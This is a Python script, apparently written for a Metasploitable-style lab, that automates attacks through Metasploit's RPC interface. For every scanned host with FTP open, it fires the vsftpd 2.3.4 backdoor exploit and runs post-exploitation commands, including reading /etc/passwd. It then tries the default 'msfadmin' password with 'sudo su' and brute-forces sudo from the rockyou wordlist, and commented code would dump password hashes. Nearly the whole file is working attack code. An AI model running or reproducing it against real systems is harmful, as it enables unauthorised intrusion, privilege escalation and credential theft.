import json
import time

import netifaces
from pymetasploit3.msfrpc import MsfRpcClient


def obtener_ip_local():
    try:
        IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
    except ValueError:
        IP = '127.0.0.1'
    return IP

def iniciar_metasploit():
    client = MsfRpcClient('msf', server='127.0.0.1', port=55553)
    return client

def cargar_datos_json(archivo):
    with open(archivo, 'r') as file:
        return json.load(file)

def ejecutar_comandos_en_victima(client, session_id, comandos):
    shell = client.sessions.session(session_id)
    output = ""
    for comando in comandos:
        shell.write(comando + '\n')

        # Comprobación dinámica de la ejecución del comando
        output_previo = ""
        tiempo_inicio = time.time()  # Marcar el tiempo de inicio
        while True:
            time.sleep(0.2)  # Un breve retraso para permitir la respuesta
            output_actual = shell.read()

            # Salir si hay nueva salida o si ha pasado cierto tiempo
            if output_actual != output_previo or time.time() - tiempo_inicio > 5:  # 5 segundos de límite
                output += f"--- Resultado de '{comando}' ---\n"
                output += output_actual
                break
            output_previo = output_actual

        output += "\n"  # Añade un salto de línea adicional para separar los resultados

    return output

# def obtener_hashes(client, session_id):
#     print(f"Intentando obtener hashes con la sesión: {session_id}")
#     hashdump = client.modules.use('post', 'linux/gather/hashdump')
#     hashdump['SESSION'] = int(session_id)
    
#     result = hashdump.execute()
#     if 'job_id' in result:
#         job_id = result['job_id']
#         final_result = check_job_status(client, job_id)
#         if final_result and 'result' in final_result:
#             print("Resultado del Job:", final_result['result'])
#         else:
#             print("No se pudo obtener el resultado del trabajo o el trabajo falló.")
#     elif 'result' in result:
#         print("Resultados obtenidos directamente:", result['result'])
#     else:
#         print("Error al enviar el job o configuración incorrecta:", result)

# def check_job_status(client, job_id, max_retries=30):
#     retry_count = 0
#     while retry_count < max_retries:
#         try:
#             job_info = client.jobs.info(job_id - 1)
#             job_info['Verbose'] = True
#             if 'result' in job_info and job_info['result'] is not None:
#                 return job_info['result']  # Devuelve el resultado final del trabajo
#             if 'error' in job_info and job_info['error']:
#                 print(f"Error al consultar el trabajo: {job_info.get('error_string', 'Sin información de error')}")
#                 return None
#         except Exception as e:
#             print(f"Error al obtener información del trabajo: {e}")
#             return None
#         time.sleep(1)
#         retry_count += 1
        
#     print("No se pudo obtener el resultado del trabajo después de varios intentos.")
#     return None

def ejecutar_comandos_post_explotacion(client, session_id):
    comandos = ['hostname', 'whoami', 'pwd', 'ls', 'cat /etc/passwd']
    output = ejecutar_comandos_en_victima(client, session_id, comandos)
    with open('vsftpd_exploit_output.txt', 'w') as f:
        f.write(output)
    
    print("Resultados de la explotación guardados en 'vsftpd_exploit_output.txt'.")

def escalar_privilegios(client, session_id):
    # Reducir primero los privilegios si es necesario
    output = ejecutar_comandos_en_victima(client, session_id, ['whoami'])
    # if 'msfadmin' not in output:
    #     output = ejecutar_comandos_en_victima(client, session_id, ['su msfadmin', 'whoami'])
    if 'root' in output:
        print("Ya tienes privilegios de root.")
        ejecutar_comandos_post_explotacion(client, session_id)
    else:
        print("Intentando escalar privilegios...")
        output = ejecutar_comandos_en_victima(client, session_id, ['sudo su'])
        output_passw = ejecutar_comandos_en_victima(client, session_id, ['msfadmin'])

        # Verificar si hemos escalado a root
        post_sudo_output = ejecutar_comandos_en_victima(client, session_id, ['whoami'])
        if 'root' in post_sudo_output:
            print("Privilegios de root obtenidos exitosamente.")
            ejecutar_comandos_post_explotacion(client, session_id)
        else:
            print("Fallo al obtener privilegios de root con contraseña estándar.")
            # Inicio de fuerza bruta
            with open('../rockyou.txt', 'r') as f:
                for password in f:
                    password = password.strip()
                    output = ejecutar_comandos_en_victima(client, session_id, ['sudo su'])
                    output_passw = ejecutar_comandos_en_victima(client, session_id, [password])
                    if 'root' in ejecutar_comandos_en_victima(client, session_id, ['whoami']):
                        print(f"Privilegios de root obtenidos exitosamente con la contraseña: {password}")
                        ejecutar_comandos_post_explotacion(client, session_id)
                        break
                else:
                    print("No se encontró la contraseña correcta usando fuerza bruta.")
    return output

def explotar_vsftpd(client, host):
    exploit_vsftpd = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit_vsftpd['RHOSTS'] = host

    # Ejecutar el exploit sin necesidad de configurar un payload separado
    result = exploit_vsftpd.execute(payload='cmd/unix/interact')

    # Lógica para verificar si la sesión ha sido creada
    session_id = None
    for _ in range(10):  # Intenta hasta 10 veces
        for s in client.sessions.list:
            session_info = client.sessions.list[s]
            if session_info['type'].startswith('shell') and session_info['tunnel_peer'].split(':')[0] == host:
                session_id = s
                break
        if session_id is not None:
            break
        time.sleep(1)  # Espera un segundo antes de volver a intentar

    if session_id is None:
        print("No se pudo obtener una sesión válida.")
        return
        
    escalar_privilegios(client, session_id)
    # obtener_hashes(client, session_id)


def seleccionar_y_explotar_vulnerabilidades(client, host, local_ip, open_ports):
    if open_ports:
        if 'tcp' in open_ports and '21' in open_ports['tcp']:
            explotar_vsftpd(client, host)


def verificar_sesion_activa(client, session_id):
    try:
        # Intentamos ejecutar un comando no intrusivo para comprobar la sesión.
        shell = client.sessions.session(session_id)
        shell.write('id\n')
        time.sleep(1)  # Espera para que el comando se ejecute.
        result = shell.read()
        if 'uid=' in result:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error al verificar la sesión: {e}")
        return False

def main():
    client = iniciar_metasploit()
    local_ip = obtener_ip_local()
    scan_results = cargar_datos_json('scan_results.json')

    for host in scan_results['hosts']:
        if host != local_ip and scan_results['hosts'][host] == 'up':
            open_ports = scan_results['ports'].get(host, {})
            seleccionar_y_explotar_vulnerabilidades(client, host, local_ip, open_ports)
